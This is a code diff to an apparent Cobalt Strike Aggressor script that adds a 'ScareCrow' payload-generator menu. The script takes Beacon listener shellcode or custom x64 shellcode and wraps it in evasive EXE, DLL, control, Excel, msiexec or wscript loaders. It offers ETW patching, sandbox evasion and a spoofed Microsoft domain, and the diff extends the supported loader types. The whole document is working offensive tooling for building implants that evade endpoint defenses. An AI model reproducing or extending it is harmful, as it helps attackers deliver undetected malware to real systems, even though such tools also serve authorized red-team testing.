@@ -11,6 +11,15 @@ $cs_directory = "/home/user/cobaltstrike";
 $python3 = "/usr/bin/python3";
 ############################################################
 
+$loader = "";
+$domain = "";
+$etw = "";
+$sandbox = "";
+$custom_bin = "";
+$loader_name = "";
+$custom_bin = "";
+$shellcode = "";
+
 menubar("ScareCrow", "scare_crow");
 
 popup scare_crow {
@@ -23,13 +32,13 @@ sub ScareCrow {
     local('$dialog %defaults');
     %defaults["domain"] = "www.microsoft.com";
 
-    $dialog = dialog("ScareCrow Payload Generator (S)", %defaults, &ScareCrowCallback);
+    $dialog = dialog("ScareCrow Payload Generator (S)", %defaults, &mainCallback);
     dialog_description($dialog, "Generate an EXE or DLL payload");
     drow_listener_stage($dialog, "listener", "Listener: ");
     drow_file($dialog, "custom_binary", "Use your custom x64 Shellcode: ");
     drow_combobox($dialog, "payload_type", "Payload Type: ", @("Stageless"));
     drow_combobox($dialog, "architecture", "Architecture: ", @("x64"));
-    drow_combobox($dialog, "loader", "Loader: ", @("binary", "dll"));
+    drow_combobox($dialog, "loader", "Loader: ", @("binary", "control", "dll", "excel", "msiexec", "wscript"));
     drow_checkbox($dialog, "etw", "ETW patching");
     drow_checkbox($dialog, "sandbox", "Sandbox evasion");
     drow_text($dialog, "domain", "Domain: ");
@@ -38,7 +47,23 @@ sub ScareCrow {
     dialog_show($dialog);
 }
 
-sub ScareCrowCallback {
+sub loaderDialog {
+    local('$dialog %defaults');
+
+    $dialog = dialog("ScareCrow Payload Generator (S)", %defaults, &loaderDialogCallback);
+    dialog_description($dialog, "Specify JScript loader name for the payload e.g. Loader.js - (**Optional For Control payloads)");
+    drow_text($dialog, "loader_name", "Loader name: ");
+    dbutton_action($dialog, "Generate");
+    dbutton_help($dialog, "https://github.com/GeorgePatsias/ScareCrow-CobaltStrike");
+    dialog_show($dialog);
+}
+
+sub loaderDialogCallback {
+    $loader_name = $3["loader_name"];
+    GeneratePayload();
+}
+
+sub mainCallback {
     if ($3["listener"] eq "") {
         show_message("No listener specified!");
         exit();
@@ -48,7 +73,7 @@ sub ScareCrowCallback {
     $domain = $3["domain"];
     $etw = $3["etw"];
     $sandbox = $3["sandbox"];
-    $custom_bin = $3['custom_binary'];
+    $custom_bin = $3["custom_binary"];
 
     if ($custom_bin ne ""){   
         $shellcode_file = openf($custom_bin);
@@ -58,14 +83,31 @@ sub ScareCrowCallback {
         $shellcode = artifact_payload($3["listener"], "raw", $3["architecture"]);
     }
 
+    if ($loader eq "binary"){
+        GeneratePayload();
+    } else if ($loader eq "dll"){
+        GeneratePayload();
+    }else if ($loader eq "control"){
+        loaderDialog();
+    }else if ($loader eq "excel"){
+        loaderDialog();
+    }else if ($loader eq "msiexec"){
+        loaderDialog();
+    }else if ($loader eq "wscript"){
+        loaderDialog();
+    }
+
+}
+
+sub GeneratePayload {
     prompt_file_save("scbeacon.bin", {
-        show_message("Generating executable, please wait... You can close this dialog while you wait.");
+        show_message("Generating payload, please wait... You can close this dialog while you wait.");
 
         $handle = openf(">" . $1);
         writeb($handle, $shellcode);
         closef($handle);
 
-        $data = exec($python3 . " " . $script_path . "/Helper.py" . " " . $scarecrow_executable . " " . $1 . " " . $loader . " " . $domain . " " . $cs_directory . " " . $etw . " " . $sandbox);
+        $data = exec($python3 . " " . $script_path . "/Helper.py" . " " . $scarecrow_executable . " " . $1 . " " . $loader . " " . $domain . " " . $cs_directory . " " . $etw . " " . $sandbox . " ". $loader_name);
         $pythondata = readAll($data);
 
         show_message("Executable saved to: " . $pythondata);
